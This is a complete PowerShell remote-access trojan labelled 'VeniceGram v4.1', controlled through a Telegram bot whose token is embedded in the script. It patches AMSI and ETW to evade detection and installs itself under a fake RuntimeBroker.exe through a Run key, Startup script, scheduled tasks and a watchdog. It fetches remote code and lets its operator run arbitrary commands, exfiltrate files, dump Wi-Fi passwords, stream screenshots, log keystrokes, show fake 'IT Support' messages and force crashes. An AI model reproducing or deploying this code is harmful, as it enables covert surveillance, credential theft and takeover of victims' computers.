# ==================================================================
#  VeniceGram v4.1   |   userland Telegram C2
# ==================================================================
$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=3072
[Net.ServicePointManager]::Expect100Continue=$false

$tok='8647242069:AAFSYxocvg0S6Q2VDL9dvttEBSkclJV-SDA'
$api="https://api.telegram.org/bot$tok"
$u='https://raw.githubusercontent.com/ThyCoder2/awshucksman/main/tg.ps1'
$ver='4.1'
$cwd=$env:USERPROFILE
$t0=Get-Date

try{$W=Add-Type -TypeDefinition @'
using System;using System.Text;using System.Runtime.InteropServices;
public class W{
 [DllImport("user32.dll")]public static extern bool ShowWindowAsync(IntPtr h,int n);
 [DllImport("user32.dll")]public static extern bool SetCursorPos(int x,int y);
 [DllImport("user32.dll")]public static extern void mouse_event(uint f,uint x,uint y,uint d,int e);
 [DllImport("user32.dll")]public static extern short GetAsyncKeyState(int k);
 [DllImport("user32.dll")]public static extern int GetKeyboardState(byte[] s);
 [DllImport("user32.dll")]public static extern int MapVirtualKey(uint c,int m);
 [DllImport("user32.dll")]public static extern int ToUnicode(uint v,uint s,byte[] k,StringBuilder b,int n,uint f);
 [DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();
 [DllImport("user32.dll")]public static extern int GetWindowText(IntPtr h,StringBuilder s,int n);
 [DllImport("user32.dll")]public static extern int SystemParametersInfo(int a,int u,string p,int f);
 [DllImport("ntdll.dll")]public static extern uint RtlSetProcessIsCritical(byte n,out byte o,uint k);
 [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h,string p);
 [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
 [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);
}
'@ -PassThru}catch{}

try{
$o=0
$a=[W]::GetProcAddress([W]::LoadLibrary('amsi.dll'),'AmsiScanBuffer')
if($a -ne [IntPtr]::Zero){[void][W]::VirtualProtect($a,6,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)}
$e=[W]::GetProcAddress([W]::LoadLibrary('ntdll.dll'),'EtwEventWrite')
if($e -ne [IntPtr]::Zero){[void][W]::VirtualProtect($e,1,0x40,[ref]$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,$e,1)}
}catch{}

function Hide{
 $h=(Get-Process -Id $PID).MainWindowHandle
 if($h -eq 0){$Host.UI.RawUI.WindowTitle='x';$h=(Get-Process|?{$_.MainWindowTitle -eq 'x'}).MainWindowHandle}
 [void][W]::ShowWindowAsync($h,0);$Host.UI.RawUI.WindowTitle=''
}
Hide

$mu=New-Object Threading.Mutex($false,"Global\vg_$env:COMPUTERNAME")
if(-not $mu.WaitOne(0)){exit}

$dir="$env:APPDATA\Microsoft\Windows\Themes"
$exe="$dir\RuntimeBroker.exe"
$dat="$dir\tg.dat"
$am ="$dir\tg.am"
$vbs="$dir\tg.vbs"
$wdf="$dir\tg.wd.ps1"
$cfg="$dir\tg.cfg"
md $dir -Force|Out-Null
if(-not(Test-Path $exe)){Copy-Item "$PSHOME\powershell.exe" $exe -Force}
if(-not(Test-Path $exe)){$exe='powershell.exe'}
$cid='';$int=2
if(Test-Path $cfg){$c=gc $cfg -raw;$cid=($c -split "`n")[0].Trim();$int=[int](($c -split "`n")[1])}

$run='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$startup="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$rc="`"$exe`" -NoP -W H -Ep Bypass -C `"iex(gc -raw '$am')`""

$amCode=@"
`$k=Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' -Name K -PassThru
`$o=0
`$a=`$k::GetProcAddress(`$k::LoadLibrary('amsi.dll'),'AmsiScanBuffer')
[void]`$k::VirtualProtect(`$a,6,0x40,[ref]`$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,`$a,6)
`$e=`$k::GetProcAddress(`$k::LoadLibrary('ntdll.dll'),'EtwEventWrite')
[void]`$k::VirtualProtect(`$e,1,0x40,[ref]`$o);[Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3),0,`$e,1)
`$p="$dat"
if(-not(Test-Path `$p)){(New-Object Net.WebClient).DownloadFile('$u',`$p)}
iex (gc -raw `$p)
"@

function Persist{
  md $dir -Force|Out-Null
  $amCode|Out-File $am -Encoding utf8 -Force
  if(-not(Test-Path $dat)){try{(New-Object Net.WebClient).DownloadFile($u,$dat)}catch{}}
  if(-not(Test-Path $dat)){return 'no payload'}
  New-ItemProperty $run -Name 'SysCheck' -Value $rc -PropertyType String -Force|Out-Null
  @"
Set s=CreateObject("WScript.Shell")
e=s.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Themes\"
s.Run """" & e & "RuntimeBroker.exe"" -NoP -W H -Ep Bypass -C """"iex(gc -raw '" & e & "tg.am')"""""",0,False
"@|Out-File $vbs -Encoding ascii -Force
  Copy-Item $vbs "$startup\tg.vbs" -Force
  schtasks /create /f /tn SysCheck /sc onlogon /tr "wscript.exe `"$vbs`"" 2>$null|Out-Null
  schtasks /create /f /tn SysCheck2 /sc minute /mo 5 /tr "wscript.exe `"$vbs`"" 2>$null|Out-Null
  schtasks /create /f /tn SysCheck3 /sc onidle /i 10 /tr "wscript.exe `"$vbs`"" 2>$null|Out-Null
  @"
`$p=$PID
while(`$true){
 if(-not(Get-Process -Id `$p -ErrorAction SilentlyContinue)){
  Start-Process '$exe' -ArgumentList '-NoP','-W','H','-Ep','Bypass','-C',"iex(gc -raw '$am')" -WindowStyle Hidden
  break
 }
 Start-Sleep 90
}
"@|Out-File $wdf -Encoding utf8 -Force
  $wm=New-Object Threading.Mutex($false,"Global\vgwd_$env:COMPUTERNAME")
  if($wm.WaitOne(0)){Start-Process $exe -ArgumentList '-NoP','-W','H','-Ep','Bypass','-File',$wdf -WindowStyle Hidden}
  return 'ok'
}
function Unpersist{
  Remove-ItemProperty $run -Name 'SysCheck'
  rm "$startup\tg.vbs","$vbs","$dat","$am","$wdf","$cfg" -Force
  schtasks /delete /f /tn SysCheck 2>$null|Out-Null
  schtasks /delete /f /tn SysCheck2 2>$null|Out-Null
  schtasks /delete /f /tn SysCheck3 2>$null|Out-Null
  Get-Process|?{(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)").CommandLine -like '*tg.wd.ps1*'}|Stop-Process -Force
}
function SaveCfg{"$cid`n$int"|Out-File $cfg -Force}

function tgs($t){
 if(-not $cid -or -not $t){return}
 foreach($ch in [regex]::Matches("$t",'[\s\S]{1,3800}')){
  try{Invoke-RestMethod -Method Post -Uri "$api/sendMessage" -Body (@{chat_id=$cid;text="``````$($ch.Value)``````";parse_mode='MarkdownV2'}|ConvertTo-Json) -ContentType 'application/json'|Out-Null}
  catch{try{Invoke-RestMethod -Method Post -Uri "$api/sendMessage" -Body (@{chat_id=$cid;text=$ch.Value}|ConvertTo-Json) -ContentType 'application/json'|Out-Null}catch{}}
  Start-Sleep -Milliseconds 600
 }
}
function tgd($p){
 if(-not(Test-Path $p)){tgs "not found: $p";return}
 if((Get-Item $p).Length -gt 45MB){tgs "too big - use zip";return}
 try{$wc=New-Object Net.WebClient;$wc.UploadFile("$api/sendDocument?chat_id=$cid",'POST',$p)|Out-Null}catch{tgs "upload failed"}
}

$jShot={
 param($t,$c)
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 while($true){
  try{
   $r=[Windows.Forms.SystemInformation]::VirtualScreen
   $b=New-Object Drawing.Bitmap $r.Width,$r.Height
   $g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($r.X,$r.Y,0,0,$b.Size)
   $f="$env:TEMP\vgs_$PID.jpg";$b.Save($f,[Drawing.Imaging.ImageFormat]::Jpeg);$g.Dispose();$b.Dispose()
   $wc=New-Object Net.WebClient;$wc.UploadFile("https://api.telegram.org/bot$t/sendDocument?chat_id=$c",'POST',$f)|Out-Null
   rm $f -Force
  }catch{}
  Start-Sleep 5
 }
}
$jKeys={
 param($t,$c)
 $k=Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int k);[DllImport("user32.dll")]public static extern int GetKeyboardState(byte[] s);[DllImport("user32.dll")]public static extern int MapVirtualKey(uint c,int m);[DllImport("user32.dll")]public static extern int ToUnicode(uint v,uint s,byte[] k,System.Text.StringBuilder b,int n,uint f);[DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();[DllImport("user32.dll")]public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int n);' -PassThru
 $buf=New-Object Text.StringBuilder;$last=''
 while($true){
  $sb=New-Object Text.StringBuilder
  $hw=[Text.StringBuilder]::new(256);[void]$k::GetWindowText($k::GetForegroundWindow(),$hw,256)
  if($hw.ToString() -ne $last){$last=$hw.ToString();[void]$sb.Append("`n[$last]`n")}
  for($i=8;$i -lt 255;$i++){
   if($k::GetAsyncKeyState($i) -eq -32767){
    $v=$k::MapVirtualKey($i,3);$st=New-Object byte[] 256;[void]$k::GetKeyboardState($st)
    if($k::ToUnicode($i,$v,$st,$buf,64,0)){[void]$sb.Append($buf.ToString());[void]$buf.Clear()}
    if($i -eq 13){[void]$sb.Append("`n")}
   }
  }
  if($sb.Length -gt 0){
   try{$wc=New-Object Net.WebClient;$wc.UploadString("https://api.telegram.org/bot$t/sendMessage","POST",(@{chat_id=$c;text=$sb.ToString()}|ConvertTo-Json))|Out-Null}catch{}
  }
  Start-Sleep -Milliseconds 150
 }
}

function Cmd($raw){
 $verb=($raw -split ' ',2)[0].ToLower()
 $rest=if($raw -match ' '){$raw.Substring($raw.IndexOf(' ')+1)}else{''}
 switch($verb){
  'help'{tgs "SESSION: diag status info sleep persist unpersist update restart hide close`nEXEC: ps cmd run cd env`nFILES: ls get put dl rm zip`nRECON: whoami net wifi sw av`nCAPTURE: shot once cam keys`nUI: text mouse click lock wallpaper msg voice volume`nPOWER: logoff reboot shutdown bsod party minimize shortcuts`nSTOP: kill <job>"}
  'diag'{
   $o=@()
   $o+="PS $($PSVersionTable.PSVersion) exec $(Get-ExecutionPolicy)"
   $o+="Elevated $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator'))"
   $o+="Token $(if((try{Invoke-RestMethod "$api/getMe" -EA 0;'ok'}catch{'DEAD'})){'ok'}else{'DEAD'})"
   $o+="DirWrite $(try{'x'|Out-File "$dir\t.t" -EA 0;rm "$dir\t.t" -EA 0;'ok'}catch{'FAIL'})"
   $o+="Payload $(Test-Path $dat) RunKey $([bool](Get-ItemProperty $run -Name SysCheck -EA 0)) Startup $(Test-Path "$startup\tg.vbs")"
   $o+="Tasks $((schtasks /query /tn SysCheck 2>$null|Select-String SysCheck|Measure-Object).Count)"
   $o+="DefRT $((Get-MpComputerStatus).RealTimeProtectionEnabled) ASR $((Get-MpPreference).AttackSurfaceReductionRules_Ids -join ',')"
   $o+="Exe $(Split-Path $exe -Leaf) chat $cid uptime $([int]((Get-Date)-$t0).TotalMinutes)m"
   tgs ($o -join "`n")
  }
  'status'{tgs "v$ver up $([int]((Get-Date)-$t0).TotalMinutes)m jobs $((Get-Job).Name -join ',')"}
  'info'{
   $os=Get-CimInstance Win32_OperatingSystem;$cs=Get-CimInstance Win32_ComputerSystem
   tgs ("$env:COMPUTERNAME`nUser $env:USERNAME`nOS $($os.Caption) $($os.BuildNumber)`nModel $($cs.Manufacturer) $($cs.Model)`nRAM $([math]::Round($cs.TotalPhysicalMemory/1GB,1))GB`nAV $((Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct).displayName -join ',')`nIP $((try{irm 'https://ipinfo.io/ip'}catch{'-'}))")
  }
  'sleep'{$n=[int]$rest;if($n -ge 1){$int=$n;SaveCfg;tgs "poll ${int}s"}}
  'persist'{tgs "persist $(Persist)"}
  'unpersist'{Unpersist;tgs 'persistence removed'}
  'update'{try{(New-Object Net.WebClient).DownloadFile($u,$dat);tgs 'updated';Start-Sleep 1;Start-Process $exe -ArgumentList '-NoP','-W','H','-Ep','Bypass','-C',"iex(gc -raw '$am')" -WindowStyle Hidden;exit}catch{tgs 'update failed'}}
  'restart'{tgs 'restarting';Start-Sleep 1;Start-Process $exe -ArgumentList '-NoP','-W','H','-Ep','Bypass','-C',"iex(gc -raw '$am')" -WindowStyle Hidden;exit}
  'hide'{Hide;tgs 're-hidden'}
  'close'{tgs 'bye';Start-Sleep 1;exit}
  'ps'{tgs (Invoke-Expression $rest 2>&1|Out-String)}
  'cmd'{tgs (cmd /c $rest 2>&1|Out-String)}
  'run'{Start-Process cmd -ArgumentList "/c start `"`" $rest" -WindowStyle Hidden;tgs "ran $rest"}
  'cd'{if(Test-Path $rest){Set-Location $rest;$cwd=(Get-Location).Path;tgs $cwd}else{tgs 'no such path'}}
  'env'{tgs (Get-ChildItem env:|%{"$($_.Name)=$($_.Value)"}|Out-String)}
  'ls'{$p=if($rest){$rest}else{$cwd};tgs (Get-ChildItem $p -Force -EA 0|%{"{0,-10} {1,12} {2}" -f $_.Mode,$_.Length,$_.Name}|Out-String)}
  'get'{tgd $rest}
  'put'{tgs 'send a file with caption put'}
  'dl'{try{$o=Join-Path $cwd (Split-Path $rest -Leaf);irm $rest -OutFile $o;tgs $o}catch{tgs 'dl failed'}}
  'rm'{rm $rest -Recurse -Force;tgs "rm $rest"}
  'zip'{try{$o="$env:TEMP\vg_$PID.zip";Compress-Archive -Path $rest -DestinationPath $o -Force;tgd $o;rm $o -Force}catch{tgs 'zip failed'}}
  'whoami'{tgs ((whoami /all) -join "`n")}
  'net'{tgs ((ipconfig /all;arp -a) -join "`n")}
  'wifi'{tgs ((netsh wlan show profiles) -join "`n");foreach($s in (netsh wlan show profiles|Select-String ': (.+)$').Matches){tgs ((netsh wlan show profile name="$($s.Groups[1].Value.Trim())" key=clear) -join "`n")}}
  'sw'{tgs (Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'|?{$_.DisplayName}|%{"$($_.DisplayName) $($_.DisplayVersion)"}|Out-String)}
  'av'{$s=Get-MpComputerStatus;tgs "RT=$($s.RealTimeProtectionEnabled) AMSI=$($s.AMSIProviderVersion) tamper=$($s.IsTamperProtected)"}
  'once'{Start-Job -ScriptBlock {param($t,$c)
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
     $r=[Windows.Forms.SystemInformation]::VirtualScreen
     $b=New-Object Drawing.Bitmap $r.Width,$r.Height
     $g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($r.X,$r.Y,0,0,$b.Size)
     $f="$env:TEMP\vgo_$PID.jpg";$b.Save($f,[Drawing.Imaging.ImageFormat]::Jpeg);$g.Dispose();$b.Dispose()
     $wc=New-Object Net.WebClient;$wc.UploadFile("https://api.telegram.org/bot$t/sendDocument?chat_id=$c",'POST',$f)|Out-Null
    } -ArgumentList $tok,$cid|Out-Null;tgs 'shot'}
  'shot'{$jShot|Start-Job -Name shot -ArgumentList $tok,$cid|Out-Null;tgs 'stream on'}
  'cam'{$jShot|Start-Job -Name cam -ArgumentList $tok,$cid|Out-Null;tgs 'cam on'}
  'keys'{$jKeys|Start-Job -Name keys -ArgumentList $tok,$cid|Out-Null;tgs 'keylog on'}
  'text'{[Windows.Forms.SendKeys]::SendWait($rest);tgs "typed $rest"}
  'mouse'{$xy=$rest -split ' ';[W]::SetCursorPos([int]$xy[0],[int]$xy[1]);tgs "mouse $rest"}
  'click'{[W]::mouse_event(0x02,0,0,0,0);[W]::mouse_event(0x04,0,0,0,0);tgs 'click'}
  'lock'{rundll32.exe user32.dll,LockWorkStation}
  'wallpaper'{try{irm $rest -OutFile "$env:TEMP\vgw.jpg";[void][W]::SystemParametersInfo(20,0,"$env:TEMP\vgw.jpg",3);tgs 'set'}catch{tgs 'bad url'}}
  'msg'{Start-Job -ScriptBlock {param($t)Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.MessageBox]::Show($t,'IT Support')|Out-Null} -ArgumentList $rest|Out-Null}
  'voice'{Add-Type -AssemblyName System.Speech;(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak($rest)}
  'volume'{$s=New-Object -ComObject WScript.Shell;1..50|%{$s.SendKeys([char]174)};1..([int]$rest/2)|%{$s.SendKeys([char]175)};tgs "vol $rest"}
  'logoff'{shutdown /l}
  'reboot'{shutdown /r /t 5}
  'shutdown'{shutdown /s /t 5}
  'bsod'{$ob=0;[void][W]::RtlSetProcessIsCritical(1,[ref]$ob,0);tgs 'critical - kill for BSOD'}
  'party'{Start-Job -ScriptBlock {Add-Type -AssemblyName System.Windows.Forms
    $c='Black','Lime','Red','Yellow','Blue','White'
    1..30|%{$f=New-Object Windows.Forms.Form;$f.FormBorderStyle='None';$f.WindowState='Maximized';$f.BackColor=[Drawing.Color]::FromName($c[$_%6]);$f.TopMost=$true;$f.Show();Start-Sleep -Milliseconds 120;$f.Close()}}|Out-Null;tgs 'party'}
  'minimize'{(New-Object -ComObject Shell.Application).MinimizeAll()}
  'shortcuts'{1..50|%{$s=(New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\USB$_.lnk");$s.TargetPath='rundll32.exe';$s.Arguments='shell32.dll,Control_RunDLL hotplug.dll';$s.Save()};tgs '50 shortcuts'}
  'kill'{Stop-Job -Name $rest -EA 0;Remove-Job -Name $rest -EA 0;tgs "stopped $rest"}
  default{tgs (Invoke-Expression $raw 2>&1|Out-String)}
 }
}

Persist|Out-Null
$off=0
$armed=$false
if($cid){$armed=$true;tgs "$env:COMPUTERNAME back online"}

while($true){
 try{
  $up=Invoke-RestMethod "$api/getUpdates?offset=$off&timeout=20"
  foreach($r in $up.result){
   $off=$r.update_id+1
   $m=$r.message
   if(-not $m -or -not $m.text){continue}
   if(-not $cid){$cid=$m.chat.id;SaveCfg;tgs "$env:COMPUTERNAME waiting - reply with the computer name"}
   if($m.chat.id -ne [int]$cid){continue}
   if(-not $armed){
     if($m.text.Trim() -eq $env:COMPUTERNAME){$armed=$true;tgs "$env:COMPUTERNAME session started"}
     continue
   }
   if($m.text.Trim() -eq $env:COMPUTERNAME){continue}
   if($m.document){
     $p=Join-Path $cwd $m.document.file_name
     try{(New-Object Net.WebClient).DownloadFile("https://api.telegram.org/file/bot$tok/$((Invoke-RestMethod "$api/getFile?file_id=$($m.document.file_id)").result.file_path)",$p);tgs $p}catch{tgs 'dl failed'}
     continue
   }
   Cmd $m.text.Trim()
  }
 }catch{Start-Sleep 3}
}